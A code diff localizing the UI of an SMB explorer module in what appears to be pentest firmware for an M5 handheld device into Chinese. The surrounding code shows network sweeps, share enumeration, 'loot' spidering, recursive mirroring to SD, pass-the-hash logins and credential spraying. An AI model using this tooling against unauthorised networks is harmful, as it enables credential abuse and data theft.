@@ -741,11 +741,12 @@ static bool smbEnumShares(Smb2& s, std::vector<String>& shares){
 static const int SMB_LTOP=30, SMB_LH=12, SMB_LBOT=116;        // list geometry
 static const int SMB_VIS=(SMB_LBOT-SMB_LTOP)/SMB_LH;          // visible rows (7)
 
-// keep the tail of an over-long string so it never wraps past the frame edge
+// clip an over-long UTF-8 string by rendered pixel width so it never wraps or cuts multi-byte chars
 static String smbClip(const String& s, int maxChars){
-    if(maxChars<3) maxChars=3;
-    if((int)s.length()<=maxChars) return s;
-    return ".."+s.substring(s.length()-(maxChars-2));
+    int maxPx = maxChars * 9;
+    if(maxPx < 36) maxPx = 36;
+    if(maxPx > 230) maxPx = 230;
+    return evilUtf8ClipPx(M5.Display, s, maxPx);
 }
 static String smbHuman(uint64_t b){
     char o[20];
@@ -757,7 +758,7 @@ static String smbHuman(uint64_t b){
 }
 // frame + title bar (title left, badge right) + subline + footer hint line
 static void smbChrome(const String& title, const String& badge, const String& sub, const String& footer){
-    M5.Display.setTextWrap(false); M5.Display.setTextFont(1); M5.Display.setTextSize(1.5);
+    M5.Display.setTextWrap(false); evilKeepCnFont(M5.Display); evilSetCnFont(M5.Display, 1.5);
     M5.Display.fillScreen(SMB_BG);
     M5.Display.drawRect(0,0,240,135,SMB_FRAME);
     M5.Display.fillRect(1,1,238,14,SMB_SEL);                        // title bar
@@ -782,17 +783,17 @@ static void smbBar(int x,int y,int w,int h,long cur,long total){
 // flags (optional, parallel to items): bit0 = draw a red LOCK tag.
 static int smbSelectList(const std::vector<String>& items, const String& title,
                          const String& badge="", const String& sub="",
-                         const String& footer="UP/DN  OK:open  DEL:back",
+                         const String& footer="上下移动  OK:打开  DEL:返回",
                          const std::vector<uint8_t>* flags=nullptr){
     if(items.empty()) return -1;
     int idx=0, top=0;
     auto rowColor=[&](const String& l)->uint16_t{
         if(l.startsWith("<")||l.startsWith("*")) return SMB_ACT;
-        if(l.startsWith("[")||l==".. (up)")      return SMB_DIR;
+        if(l.startsWith("[")||l==".. (上级)")    return SMB_DIR;
         return SMB_TEXT;
     };
     auto drawRows=[&](){
-        M5.Display.setTextFont(1); M5.Display.setTextSize(1.5); M5.Display.setTextWrap(false);
+        evilKeepCnFont(M5.Display); evilSetCnFont(M5.Display, 1.5); M5.Display.setTextWrap(false);
         for(int i=0;i<SMB_VIS;i++){ int o=top+i, y=SMB_LTOP+i*SMB_LH; bool cur=(o==idx);
             uint16_t bg = cur?SMB_SEL:SMB_BG;
             M5.Display.fillRect(2,y,234,SMB_LH,bg);
@@ -803,7 +804,7 @@ static int smbSelectList(const std::vector<String>& items, const String& title,
             M5.Display.setCursor(5,y+2);  M5.Display.print(cur?">":" ");
             M5.Display.setCursor(16,y+2); M5.Display.print(smbClip(items[o], locked?18:24));
             if(locked){ M5.Display.setTextColor(cur?SMB_TITLE:SMB_LOCK,bg);
-                        M5.Display.setCursor(235-M5.Display.textWidth("LOCK"),y+2); M5.Display.print("LOCK"); }
+                        M5.Display.setCursor(235-M5.Display.textWidth("锁定"),y+2); M5.Display.print("锁定"); }
         }
         if((int)items.size()>SMB_VIS){                             // scrollbar thumb
             int trackH=SMB_LBOT-SMB_LTOP;
@@ -827,8 +828,8 @@ static int smbSelectList(const std::vector<String>& items, const String& title,
 
 // centered two-line notice inside the frame
 static void smbMsg(const String& l1,const String& l2="",int holdMs=0){
-    smbChrome("SMB EXPLORER","","","");
-    M5.Display.setTextFont(1); M5.Display.setTextSize(1.5); M5.Display.setTextWrap(false);
+    smbChrome("SMB 浏览器","","","");
+    evilKeepCnFont(M5.Display); evilSetCnFont(M5.Display, 1.5); M5.Display.setTextWrap(false);
     String c1=smbClip(l1,24); M5.Display.setTextColor(SMB_TEXT,SMB_BG);
     M5.Display.setCursor((240-M5.Display.textWidth(c1))/2,56); M5.Display.print(c1);
     if(l2.length()){ String c2=smbClip(l2,24); M5.Display.setTextColor(SMB_TITLE,SMB_BG);
@@ -905,7 +906,7 @@ static long smbReadToFile(Smb2& s, const uint8_t fid[16], uint64_t fsize, File& 
         if(err) break;
         if(show && millis()-lastDraw>160){
             M5.Display.fillRect(2,86,234,26,SMB_BG);
-            M5.Display.setTextFont(1); M5.Display.setTextSize(1.5); M5.Display.setTextColor(SMB_TITLE,SMB_BG);
+            evilKeepCnFont(M5.Display); evilSetCnFont(M5.Display, 1.5); M5.Display.setTextColor(SMB_TITLE,SMB_BG);
             String p=smbHuman((uint64_t)total)+" / "+smbHuman(fsize);
             M5.Display.setCursor((240-M5.Display.textWidth(p))/2,88); M5.Display.print(p);
             smbBar(6,104,228,8,(long)total,(long)fsize); M5.Display.display(); lastDraw=millis();
@@ -1032,7 +1033,7 @@ static long smbSpider(Smb2& s, const String& share, const String& startPath, Str
     if(lf) lf.printf("# SMB loot  host=%s  share=%s\n", s.host.toString().c_str(), share.c_str());
     f.printf("# SMB spider  host=%s  share=%s  start=\\%s\n",
              s.host.toString().c_str(), share.c_str(), startPath.c_str());
-    smbChrome("SPIDER", "", share+"\\"+startPath, "DEL:abort");
+    smbChrome("目录爬取", "", share+"\\"+startPath, "DEL:中止");
     const long MAX_ENTRIES=50000; const int MAX_DEPTH=40;
     std::vector<String> stack; stack.push_back(startPath);
     long count=0, dirs=0, loot=0; uint32_t lastDraw=0; bool aborted=false;
@@ -1063,12 +1064,12 @@ static long smbSpider(Smb2& s, const String& share, const String& startPath, Str
         for(int i=(int)subdirs.size()-1;i>=0;i--) stack.push_back(subdirs[i]); // listed order
         if(millis()-lastDraw>180){
             M5.Display.fillRect(2,50,234,50,SMB_BG);
-            M5.Display.setTextFont(1); M5.Display.setTextSize(1.5);
+            evilKeepCnFont(M5.Display); evilSetCnFont(M5.Display, 1.5);
             M5.Display.setTextColor(SMB_TEXT,SMB_BG); M5.Display.setCursor(8,54);
-            M5.Display.printf("dirs  %ld", dirs);
-            M5.Display.setCursor(8,68); M5.Display.printf("items %ld", count);
+            M5.Display.printf("目录  %ld", dirs);
+            M5.Display.setCursor(8,68); M5.Display.printf("项目  %ld", count);
             M5.Display.setTextColor(SMB_TITLE,SMB_BG); M5.Display.setCursor(8,82);
-            M5.Display.printf("loot  %ld", loot);
+            M5.Display.printf("敏感  %ld", loot);
             M5.Display.display(); lastDraw=millis();
         }
         M5.update(); cardUpdate();
@@ -1091,7 +1092,7 @@ static long smbMirror(Smb2& s, const String& share, const String& startPath, uin
     smbEnsureDir();
     String base="/evil/smb/mirror/"+smbSafeName(share);
     if(rootOut) *rootOut=base;
-    smbChrome("MIRROR", "", share+"\\"+startPath, "DEL:abort");
+    smbChrome("镜像下载", "", share+"\\"+startPath, "DEL:中止");
     const int MAX_DEPTH=40;
     std::vector<String> stack; stack.push_back(startPath);
     long files=0, skipped=0; long long bytes=0; uint32_t lastDraw=0; bool aborted=false;
@@ -1114,12 +1115,12 @@ static long smbMirror(Smb2& s, const String& share, const String& startPath, uin
             }
             if(millis()-lastDraw>180){
                 M5.Display.fillRect(2,50,234,50,SMB_BG);
-                M5.Display.setTextFont(1); M5.Display.setTextSize(1.5);
+                evilKeepCnFont(M5.Display); evilSetCnFont(M5.Display, 1.5);
                 M5.Display.setTextColor(SMB_TEXT,SMB_BG); M5.Display.setCursor(8,54);
-                M5.Display.printf("files %ld", files);
-                M5.Display.setCursor(8,68); M5.Display.printf("size  %lldKB", bytes/1024);
+                M5.Display.printf("文件  %ld", files);
+                M5.Display.setCursor(8,68); M5.Display.printf("大小  %lldKB", bytes/1024);
                 M5.Display.setTextColor(SMB_FRAME,SMB_BG); M5.Display.setCursor(8,82);
-                M5.Display.printf("skip  %ld", skipped);
+                M5.Display.printf("跳过  %ld", skipped);
                 M5.Display.display(); lastDraw=millis();
             }
             M5.update(); cardUpdate();
@@ -1137,7 +1138,7 @@ static long smbMirror(Smb2& s, const String& share, const String& startPath, uin
 
 // auth badge shown in the title bar
 static String smbBadge(Smb2& s){
-    return s.authUser.length()? ("["+s.authUser+"]") : (s.authMode_guest?"[guest]":"[anon]");
+    return s.authUser.length()? ("["+s.authUser+"]") : (s.authMode_guest?"[访客]":"[匿名]");
 }
 static String smbDialectStr(uint16_t d){
     switch(d){ case 0x202:return "2.0.2"; case 0x210:return "2.1"; case 0x300:return "3.0"; case 0x302:return "3.0.2"; default:return "0x"+String(d,HEX); }
@@ -1185,20 +1186,20 @@ static String smbWriteReport(Smb2& s, const std::vector<String>& shares,
 // full host details, unclipped. Long names/domains wrap (small font) so they are
 // fully readable instead of the "..tail" clipping used in the lists.
 static void smbHostInfo(Smb2& s){
-    smbChrome("HOST INFO", smbBadge(s), s.host.toString(), "OK/DEL: back");
-    M5.Display.setTextFont(1); M5.Display.setTextSize(1); M5.Display.setTextWrap(true);
+    smbChrome("主机详情", smbBadge(s), s.host.toString(), "OK/DEL: 返回");
+    evilKeepCnFont(M5.Display); evilSetCnFont(M5.Display, 1); M5.Display.setTextWrap(true);
     int y=34;
     auto field=[&](const char* k, const String& v){
         M5.Display.setTextColor(SMB_TITLE,SMB_BG); M5.Display.setCursor(6,y); M5.Display.print(k);
         M5.Display.setTextColor(SMB_TEXT,SMB_BG);  M5.Display.setCursor(6,y+10);
-        M5.Display.print(v.length()?v:String("(unknown)"));
+        M5.Display.print(v.length()?v:String("(未知)"));
         y += 24;                                   // room for one wrap line
     };
-    field("name",   s.targetName);
-    field("domain", s.targetDomain);
+    field("主机名", s.targetName);
+    field("域/工作组", s.targetDomain);
     M5.Display.setTextColor(SMB_TITLE,SMB_BG); M5.Display.setCursor(6,y);
-    M5.Display.print("dialect SMB "+smbDialectStr(s.dialect)+"   signing "+(s.signingRequired?"required":"optional"));
-    y+=12; M5.Display.setCursor(6,y); M5.Display.print("identity "+smbIdentityStr(s));
+    M5.Display.print("协议 SMB "+smbDialectStr(s.dialect)+"   签名 "+(s.signingRequired?"必需":"可选"));
+    y+=12; M5.Display.setCursor(6,y); M5.Display.print("当前身份 "+smbIdentityStr(s));
     M5.Display.setTextWrap(false); M5.Display.display();
     enterDebounce();
     while(true){ M5.update(); cardUpdate(); if(kp(KEY_BACKSPACE)||kp(KEY_ENTER)) break; delay(40); }
@@ -1213,15 +1214,15 @@ static bool smbSpiderPick(std::vector<uint8_t>& on){
     const int total=N+3;                     // ALL + exts + (no ext) + START
     int idx=0, top=0;
     auto label=[&](int r)->String{
-        if(r==0){ bool a=true; for(int i=0;i<N+1;i++) if(!on[i]){a=false;break;} return String(a?"[*] ALL":"[ ] ALL"); }
+        if(r==0){ bool a=true; for(int i=0;i<N+1;i++) if(!on[i]){a=false;break;} return String(a?"[*] 全部":"[ ] 全部"); }
         if(r>=1 && r<=N) return String(on[r-1]?"[x] ":"[ ] ")+SPIDER_EXTS[r-1];
-        if(r==N+1)       return String(on[N]?"[x] (no ext)":"[ ] (no ext)");
-        return String(">> START SPIDER <<");
+        if(r==N+1)       return String(on[N]?"[x] (无扩展名)":"[ ] (无扩展名)");
+        return String(">> 开始爬取 <<");
     };
     auto toggleAll=[&](){ bool a=true; for(int i=0;i<N+1;i++) if(!on[i]){a=false;break;} uint8_t v=a?0:1; for(int i=0;i<N+1;i++) on[i]=v; };
     auto draw=[&](){
-        smbChrome("SPIDER FILTER","","pick extensions","OK:toggle  DEL:cancel");
-        M5.Display.setTextFont(1); M5.Display.setTextSize(1.5); M5.Display.setTextWrap(false);
+        smbChrome("爬取过滤","","选择文件后缀","OK:切换  DEL:取消");
+        evilKeepCnFont(M5.Display); evilSetCnFont(M5.Display, 1.5); M5.Display.setTextWrap(false);
         for(int i=0;i<SMB_VIS;i++){ int o=top+i, y=SMB_LTOP+i*SMB_LH;
             if(o>=total){ M5.Display.fillRect(2,y,234,SMB_LH,SMB_BG); continue; }
             bool cur=(o==idx); uint16_t bg=cur?SMB_SEL:SMB_BG; M5.Display.fillRect(2,y,234,SMB_LH,bg);
@@ -1256,24 +1257,24 @@ static void smbBrowse(Smb2& s, const String& share){
     String cur="";  // relative path, no leading backslash
     while(true){
         std::vector<SmbEntry> entries;
-        smbMsg("Listing...", share+"\\"+cur);
+        smbMsg("正在读取目录...", share+"\\"+cur);
         if(!s.listDir(cur,entries)){
-            smbMsg("List failed",s.lastError,1500);
+            smbMsg("读取目录失败",s.lastError,1500);
             if(cur.length()==0) return;                      // root failed -> leave share
             int sl=cur.lastIndexOf('\\'); cur=(sl<0)?"":cur.substring(0,sl); // else fall back one level
             continue;
         }
         std::vector<String> labels; std::vector<int> map; // -1 up, -3 spider, -4 mirror
-        if(cur.length()){ labels.push_back(".. (up)"); map.push_back(-1); }
-        labels.push_back("<spider to SD>");    map.push_back(-3);
-        labels.push_back("<mirror to SD>");    map.push_back(-4);
+        if(cur.length()){ labels.push_back(".. (上级)"); map.push_back(-1); }
+        labels.push_back("<递归爬取到SD>");    map.push_back(-3);
+        labels.push_back("<镜像下载到SD>");    map.push_back(-4);
         for(size_t i=0;i<entries.size();i++){
             String lbl = entries[i].isDir ? ("["+entries[i].name+"]")
                                           : (entries[i].name+"  "+smbHuman(entries[i].size));
             labels.push_back(lbl); map.push_back((int)i);
         }
         String sub = cur.length()? (share+"\\"+cur) : (share+"\\");
-        int sel=smbSelectList(labels, "BROWSE", smbBadge(s), sub, "OK:open  DEL:leave");
+        int sel=smbSelectList(labels, "浏览共享", smbBadge(s), sub, "OK:打开  DEL:离开");
         if(sel<0) return;                 // backspace: leave share
         int e=map[sel];
         if(e==-2) continue;
@@ -1281,14 +1282,14 @@ static void smbBrowse(Smb2& s, const String& share){
             std::vector<uint8_t> filter;
             if(!smbSpiderPick(filter)) continue;        // pick extensions first; DEL = cancel
             String outPath; long loot=0; long n=smbSpider(s,share,cur,&outPath,&loot,&filter);
-            if(n>=0) smbMsg("Spider saved", String(n)+" items / "+String(loot)+" loot", 2500);
-            else     smbMsg("Spider failed", s.lastError, 2000);
+            if(n>=0) smbMsg("爬取已保存", String(n)+" 项 / "+String(loot)+" 敏感", 2500);
+            else     smbMsg("爬取失败", s.lastError, 2000);
             continue;
         }
         if(e==-4){                        // mirror (recursive download) to SD, 10MB/file cap
             String root; long kb=0, skip=0; long nf=smbMirror(s,share,cur,10UL*1024*1024,&root,&kb,&skip);
-            if(nf>=0) smbMsg("Mirror done", String(nf)+" files / "+smbHuman((uint64_t)kb*1024), 2800);
-            else      smbMsg("Mirror failed", s.lastError, 2000);
+            if(nf>=0) smbMsg("镜像完成", String(nf)+" 文件 / "+smbHuman((uint64_t)kb*1024), 2800);
+            else      smbMsg("镜像失败", s.lastError, 2000);
             continue;
         }
         if(e==-1){ int sl=cur.lastIndexOf('\\'); cur=(sl<0)?"":cur.substring(0,sl); continue; }
@@ -1296,13 +1297,13 @@ static void smbBrowse(Smb2& s, const String& share){
         String child = cur.length()? (cur+"\\"+en.name) : en.name;
         if(en.isDir){ cur=child; continue; }
         // file: action
-        std::vector<String> act={"Download to SD","Back"};
-        int a=smbSelectList(act, "FILE", smbHuman(en.size), en.name, "OK:select  DEL:back");
+        std::vector<String> act={"下载到SD卡","返回"};
+        int a=smbSelectList(act, "文件操作", smbHuman(en.size), en.name, "OK:选择  DEL:返回");
         if(a==0){
-            smbMsg("Downloading",en.name);
+            smbMsg("正在下载",en.name);
             long w=smbDownload(s,child,en.name);
-            if(w>=0) smbMsg("Saved", en.name+"  "+smbHuman((uint64_t)w), 2000);
-            else smbMsg("Download failed",s.lastError,2000);
+            if(w>=0) smbMsg("已保存", en.name+"  "+smbHuman((uint64_t)w), 2000);
+            else smbMsg("下载失败",s.lastError,2000);
         }
     }
 }
@@ -1319,9 +1320,9 @@ static void smbBrowse(Smb2& s, const String& share){
 // the menu, and restore the menu cleanly when the op ends.
 static void smbSerialScreenBegin(const String& banner){
     inMenu=false;
-    smbChrome("SMB EXPLORER","serial",banner,"driven over USB serial");
-    M5.Display.setTextFont(1); M5.Display.setTextSize(1.5); M5.Display.setTextColor(SMB_TEXT,SMB_BG);
-    M5.Display.setCursor((240-M5.Display.textWidth("see serial console"))/2,60); M5.Display.print("see serial console");
+    smbChrome("SMB 浏览器","串口",banner,"正由USB串口控制");
+    evilKeepCnFont(M5.Display); evilSetCnFont(M5.Display, 1.5); M5.Display.setTextColor(SMB_TEXT,SMB_BG);
+    M5.Display.setCursor((240-M5.Display.textWidth("请查看串口终端"))/2,60); M5.Display.print("请查看串口终端");
     M5.Display.display();
 }
 static void smbSerialScreenEnd(){
@@ -1682,15 +1683,15 @@ void sdRemove(const String& args){
 // prompt user + password on-device, then re-authenticate the session with them.
 // returns true if the server accepted the real credentials.
 static bool smbPromptLogin(Smb2& s){
-    smbChrome("LOGIN","","user  (DOMAIN\\user ok)","type + OK");
+    smbChrome("账号登录","","用户名 (支持 域\\用户)","输入 + OK");
     M5.Display.drawRect(3,29,234,16,SMB_FRAME); M5.Display.display(); enterDebounce();
     String user=getUserInput(false,false);        // non-empty username
-    smbChrome("LOGIN","","password  (empty ok)","type + OK");
+    smbChrome("账号登录","","密码 (可留空)","输入 + OK");
     M5.Display.drawRect(3,29,234,16,SMB_FRAME); M5.Display.display(); enterDebounce();
     String pass=getUserInput(true,true);           // password may be empty
-    smbMsg("Logging in",user);
+    smbMsg("正在登录",user);
     bool ok=s.authenticateUser(user,pass);
-    smbMsg(ok?"Login OK":"Login failed", ok?("as "+user):s.lastError, 1600);
+    smbMsg(ok?"登录成功":"登录失败", ok?("用户: "+user):s.lastError, 1600);
     return ok;
 }
 // create a commented NT-hash capture template the first time.
@@ -1728,12 +1729,12 @@ static bool smbPromptHashFromSD(Smb2& s){
         if(smbParseHashLine(ln,u,h)){ users.push_back(u); hashes.push_back(h);
             labels.push_back(u+"  "+h.substring(0,8)+".."); } }
         f.close(); }
-    if(users.empty()){ smbMsg("No hashes on SD","put them in smb_hashes.txt",2600); return false; }
-    int sel=smbSelectList(labels, "PASS THE HASH", "from SD", "smb_hashes.txt", "OK:use  DEL:cancel");
+    if(users.empty()){ smbMsg("SD卡无哈希","请存入 smb_hashes.txt",2600); return false; }
+    int sel=smbSelectList(labels, "哈希传递", "SD卡", "smb_hashes.txt", "OK:使用  DEL:取消");
     if(sel<0) return false;
-    smbMsg("Pass-the-hash", users[sel]);
+    smbMsg("哈希传递登录", users[sel]);
     bool ok=s.authenticateHash(users[sel], hashes[sel]);
-    smbMsg(ok?"PtH OK":"PtH failed", ok?("as "+users[sel]):s.lastError, 1600);
+    smbMsg(ok?"哈希登录成功":"哈希登录失败", ok?("用户: "+users[sel]):s.lastError, 1600);
     return ok;
 }
 
@@ -1826,13 +1827,13 @@ static bool smbTryCredsFile(Smb2& s, int* triedOut, String* hitOut, bool verbose
     bool combo = SD.exists(SMB_USERS_FILE) && SD.exists(SMB_PASS_FILE);
     int total = combo ? (smbCountLines(SMB_USERS_FILE)*smbCountLines(SMB_PASS_FILE)) : smbCountLines(SMB_CREDS_FILE);
     if(total>SMB_SPRAY_MAXTRIES) total=SMB_SPRAY_MAXTRIES;
-    if(showUI) smbChrome("SPRAY", smbBadge(s), s.host.toString(), "DEL:abort");
+    if(showUI) smbChrome("凭据喷洒", smbBadge(s), s.host.toString(), "DEL:中止");
     // draw the current attempt (number / total + the cred being tried + a bar)
     auto drawSpray=[&](const String& cred){
         if(!showUI) return;
         M5.Display.fillRect(2,40,234,66,SMB_BG);
-        M5.Display.setTextFont(1); M5.Display.setTextSize(1.5); M5.Display.setTextColor(SMB_TEXT,SMB_BG);
-        char t[24]; snprintf(t,sizeof t,"try %d / %d", tried, total);
+        evilKeepCnFont(M5.Display); evilSetCnFont(M5.Display, 1.5); M5.Display.setTextColor(SMB_TEXT,SMB_BG);
+        char t[32]; snprintf(t,sizeof t,"尝试 %d / %d", tried, total);
         M5.Display.setCursor((240-M5.Display.textWidth(t))/2,46); M5.Display.print(t);
         String c=smbClip(cred,24); M5.Display.setTextColor(SMB_TITLE,SMB_BG);
         M5.Display.setCursor((240-M5.Display.textWidth(c))/2,66); M5.Display.print(c);
@@ -1922,7 +1923,7 @@ void smbSerialSpray(const String& args){
 // one-line boxed text prompt reusing the keyboard input helper; empty = cancel.
 // getUserInput draws at (5,30), so the field sits just under the header.
 static String smbPromptText(const String& title, const String& label){
-    smbChrome(title,"",label,"type + OK   empty=cancel");
+    smbChrome(title,"",label,"输入 + OK   留空=取消");
     M5.Display.drawRect(3,29,234,16,SMB_FRAME);          // input box (getUserInput writes at 5,30)
     M5.Display.display(); enterDebounce();
     return getUserInput(false,true);
@@ -1931,36 +1932,36 @@ static String smbPromptText(const String& title, const String& label){
 void smbDiscoverMenu(){
     inMenu=false;                                   // own the screen; waitAndReturnToMenu restores
     if(WiFi.status()!=WL_CONNECTED || WiFi.localIP().toString()=="0.0.0.0"){
-        waitAndReturnToMenu("Not connected to WiFi"); return;
+        waitAndReturnToMenu("未连接 WiFi"); return;
     }
     // ---- discovery: ARP blast the /24, then TCP-probe 445 only on responders ----
     //  Old path TCP-connected to every one of the 254 hosts (long timeout each).
     //  New path: (1) one ARP blast of the /24 -> the handful of live hosts, then
     //  (2) short-timeout 445 probe on just those. Seconds instead of a minute.
     IPAddress net=WiFi.localIP(); net[3]=0;
-    smbChrome("SMB EXPLORER","arp", net.toString()+"/24", "DEL:skip scan");
+    smbChrome("SMB 浏览器","ARP", net.toString()+"/24", "DEL:跳过扫描");
     std::vector<IPAddress> smbHosts;
     uint32_t lastDraw=0;
 
     auto drawScan=[&](const char* phase,long cur,long total){
         M5.Display.fillRect(2,52,234,40,SMB_BG);
-        M5.Display.setTextFont(1); M5.Display.setTextSize(1.5); M5.Display.setTextColor(SMB_TEXT,SMB_BG);
-        char line[32]; snprintf(line,sizeof line,"%s %ld / %ld",phase,cur,total);
+        evilKeepCnFont(M5.Display); evilSetCnFont(M5.Display, 1.5); M5.Display.setTextColor(SMB_TEXT,SMB_BG);
+        char line[40]; snprintf(line,sizeof line,"%s %ld / %ld",phase,cur,total);
         M5.Display.setCursor((240-M5.Display.textWidth(line))/2,54); M5.Display.print(line);
         smbBar(20,70,200,9,cur,total);
-        M5.Display.setTextColor(SMB_TITLE,SMB_BG); char h[20]; snprintf(h,sizeof h,"hosts: %d",(int)smbHosts.size());
+        M5.Display.setTextColor(SMB_TITLE,SMB_BG); char h[28]; snprintf(h,sizeof h,"发现主机: %d",(int)smbHosts.size());
         M5.Display.setCursor((240-M5.Display.textWidth(h))/2,84); M5.Display.print(h);
         M5.Display.display(); lastDraw=millis();
     };
 
     // Phase 1: UDP-trigger ARP across the whole /24, read back the live hosts
     std::vector<IPAddress> live;
-    smbArpSweep(net, live, [&](int cur,int total){ drawScan("arp sweep",cur,total); });
+    smbArpSweep(net, live, [&](int cur,int total){ drawScan("ARP扫描",cur,total); });
 
     // Phase 2: TCP-probe 445 only on the ARP responders (short timeout)
     for(size_t k=0;k<live.size();k++){
         if(kp(KEY_BACKSPACE)) break;
-        if(millis()-lastDraw>100) drawScan("check 445",(long)(k+1),(long)live.size());
+        if(millis()-lastDraw>100) drawScan("探测445",(long)(k+1),(long)live.size());
         WiFiClient c;
         if(c.connect(live[k],445,400)){ smbHosts.push_back(live[k]); c.stop(); }   // 400ms cap
     }
@@ -1976,104 +1977,104 @@ void smbDiscoverMenu(){
     smbLog("DISCOVER "+net.toString()+"/24 -> "+String((int)smbHosts.size())+" host(s) with 445");
     // recon: grab each SMB host's computer name (one quick NTLM round each)
     std::vector<String> hostNames(smbHosts.size());
-    for(size_t i=0;i<smbHosts.size();i++){ drawScan("identify",(long)i+1,(long)smbHosts.size()); hostNames[i]=smbIdentify(smbHosts[i]); }
+    for(size_t i=0;i<smbHosts.size();i++){ drawScan("识别主机",(long)i+1,(long)smbHosts.size()); hostNames[i]=smbIdentify(smbHosts[i]); }
 
     while(true){
         std::vector<String> hl;
         for(size_t i=0;i<smbHosts.size();i++) hl.push_back(smbHosts[i].toString()+(hostNames[i].length()?("  "+hostNames[i]):""));
-        hl.push_back("<enter IP>");
-        int hi=smbSelectList(hl, "HOSTS", String((int)smbHosts.size())+" up",
-                             net.toString()+"/24", "OK:connect  DEL:back");
-        if(hi<0){ waitAndReturnToMenu("Back to menu"); return; }
+        hl.push_back("<手动输入IP>");
+        int hi=smbSelectList(hl, "主机列表", String((int)smbHosts.size())+" 在线",
+                             net.toString()+"/24", "OK:连接  DEL:返回");
+        if(hi<0){ waitAndReturnToMenu("返回主菜单"); return; }
         IPAddress target;
         if(hi==(int)smbHosts.size()){                 // manual IP entry
-            String ips=smbPromptText("ENTER IP","IP address:"); ips.trim();
+            String ips=smbPromptText("输入 IP","IP 地址:"); ips.trim();
             if(ips.length()==0) continue;             // cancelled
-            if(!target.fromString(ips)){ smbMsg("Bad IP",ips,1200); continue; }
+            if(!target.fromString(ips)){ smbMsg("无效 IP",ips,1200); continue; }
             bool have=false; for(auto&h:smbHosts) if(h==target) have=true;
             if(!have) smbHosts.push_back(target);
         } else target=smbHosts[hi];
         Smb2 s;
-        smbMsg("Connecting",target.toString());
-        if(!s.connect(target)){ smbMsg("TCP failed",s.lastError,1500); continue; }
-        if(!s.negotiate()){ smbMsg("Negotiate failed",s.lastError,1500); s.close(); continue; }
-        if(!s.authenticate()){ smbMsg("Auth refused","anon+guest denied",2000); smbLog("AUTH "+target.toString()+" refused (anon+guest)"); s.close(); continue; }
+        smbMsg("正在连接",target.toString());
+        if(!s.connect(target)){ smbMsg("TCP连接失败",s.lastError,1500); continue; }
+        if(!s.negotiate()){ smbMsg("协商失败",s.lastError,1500); s.close(); continue; }
+        if(!s.authenticate()){ smbMsg("认证被拒","匿名与访客均被拒",2000); smbLog("AUTH "+target.toString()+" refused (anon+guest)"); s.close(); continue; }
         smbLog("AUTH "+target.toString()+" ok ("+(s.authMode_guest?"guest":"anon")+") dialect="+String(s.dialect,HEX));
-        smbMsg(s.authMode_guest?"Guest OK":"Anonymous OK","enumerating shares...",600);
+        smbMsg(s.authMode_guest?"访客登录成功":"匿名登录成功","正在枚举共享...",600);
         std::vector<String> shares;
-        if(!smbEnumShares(s,shares)||shares.empty()){ smbMsg("No shares listed",s.lastError,1800); s.close(); continue; }
+        if(!smbEnumShares(s,shares)||shares.empty()){ smbMsg("未发现共享",s.lastError,1800); s.close(); continue; }
         smbLog("SHARES "+target.toString()+" -> "+String((int)shares.size()));
         // probe which shares the current identity can open (for the LOCK tags)
         std::vector<uint8_t> shareLock(shares.size(),0);
         auto probeShares=[&](){
             for(size_t i=0;i<shares.size();i++){
                 M5.Display.fillRect(2,52,234,30,SMB_BG);
-                M5.Display.setTextFont(1); M5.Display.setTextSize(1.5); M5.Display.setTextColor(SMB_TEXT,SMB_BG);
-                M5.Display.setCursor(8,58); M5.Display.printf("checking access %u/%u",(unsigned)(i+1),(unsigned)shares.size());
+                evilKeepCnFont(M5.Display); evilSetCnFont(M5.Display, 1.5); M5.Display.setTextColor(SMB_TEXT,SMB_BG);
+                M5.Display.setCursor(8,58); M5.Display.printf("检查权限 %u/%u",(unsigned)(i+1),(unsigned)shares.size());
                 M5.Display.display();
                 if(shares[i].endsWith("$")){ shareLock[i]=1; continue; }
                 shareLock[i] = s.treeConnect(shares[i]) ? 0 : 1;
                 if(!shareLock[i]) s.treeDisconnect();
             }
         };
-        smbChrome("SHARES", smbBadge(s), target.toString(), "please wait");
+        smbChrome("共享列表", smbBadge(s), target.toString(), "请稍候");
         probeShares();
         String dname = s.targetName.length()? s.targetName : target.toString();
-        String dsub = dname+"  SMB"+smbDialectStr(s.dialect)+(s.signingRequired?" sign":"");
+        String dsub = dname+"  SMB"+smbDialectStr(s.dialect)+(s.signingRequired?" 签名":"");
         while(true){
             std::vector<String> sl=shares;
             std::vector<uint8_t> fl=shareLock;        // flags parallel to sl (actions unflagged)
-            int iInfo=shares.size();  sl.push_back("<host info>");      fl.push_back(0);
-            int iLogin=sl.size();     sl.push_back("<login user/pass>"); fl.push_back(0);
-            int iPth=sl.size();       sl.push_back("<pass the hash>");   fl.push_back(0);
-            int iSpray=sl.size();     sl.push_back("<creds spray>");     fl.push_back(0);
-            int iReport=sl.size();    sl.push_back("<report+matrix>");   fl.push_back(0);
-            int iRescan=sl.size();    sl.push_back("<rescan hosts>");    fl.push_back(0);
-            int si=smbSelectList(sl, "SHARES", smbBadge(s), dsub, "OK:open  DEL:back", &fl);
+            int iInfo=shares.size();  sl.push_back("<主机详情>");      fl.push_back(0);
+            int iLogin=sl.size();     sl.push_back("<账号密码登录>"); fl.push_back(0);
+            int iPth=sl.size();       sl.push_back("<哈希传递登录>");   fl.push_back(0);
+            int iSpray=sl.size();     sl.push_back("<凭据喷洒>");     fl.push_back(0);
+            int iReport=sl.size();    sl.push_back("<报告与权限矩阵>");   fl.push_back(0);
+            int iRescan=sl.size();    sl.push_back("<重新扫描主机>");    fl.push_back(0);
+            int si=smbSelectList(sl, "共享列表", smbBadge(s), dsub, "OK:打开  DEL:返回", &fl);
             if(si<0) break;
             if(si==iInfo){ smbHostInfo(s); continue; }
-            if(si==iLogin){ if(smbPromptLogin(s)){ smbChrome("SHARES",smbBadge(s),target.toString(),"please wait"); probeShares(); } continue; }
-            if(si==iPth){ if(smbPromptHashFromSD(s)){ smbChrome("SHARES",smbBadge(s),target.toString(),"please wait"); probeShares(); } continue; }
+            if(si==iLogin){ if(smbPromptLogin(s)){ smbChrome("共享列表",smbBadge(s),target.toString(),"请稍候"); probeShares(); } continue; }
+            if(si==iPth){ if(smbPromptHashFromSD(s)){ smbChrome("共享列表",smbBadge(s),target.toString(),"请稍候"); probeShares(); } continue; }
             if(si==iReport){
-                smbChrome("REPORT", smbBadge(s), dname, "writing matrix...");
+                smbChrome("生成报告", smbBadge(s), dname, "正在写入矩阵...");
                 String rp=smbWriteReport(s,shares,[&](int c,int t){
